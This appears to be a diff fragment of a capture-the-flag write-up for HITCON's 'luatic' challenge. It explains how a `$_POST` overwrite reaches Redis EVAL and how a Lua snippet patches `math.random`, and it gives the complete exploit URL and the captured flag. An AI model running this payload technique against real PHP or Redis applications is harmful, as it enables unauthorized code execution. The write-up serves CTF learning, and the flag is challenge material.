@@ -79,6 +79,7 @@ so `$_POST` variable will be overwritten to `['MY_SET_COMMAND' => 'set', 'TEST_K
 and will be extracted to php variables
 - To bypass `str_replace(str_split("[]{}=.'\""), "", $v)` replacement, we use `for k, v in pairs(math) do rawset(math, k, function() return 123 end) end` to reset `math.random` function
 - Final payload: `/luatic.php?token=TEAM_TOKEN&guess=123&_POST[MY_SET_COMMAND]=eval&_POST[TEST_KEY]=for k, v in pairs(math) do rawset(math, k, function() return 123 end) end&_POST[TEST_VALUE]=0`
+
 and got the Flag: `hitcon{Lua^H Red1s 1s m4g1c!!!}`
 
 Please follow for more informations:
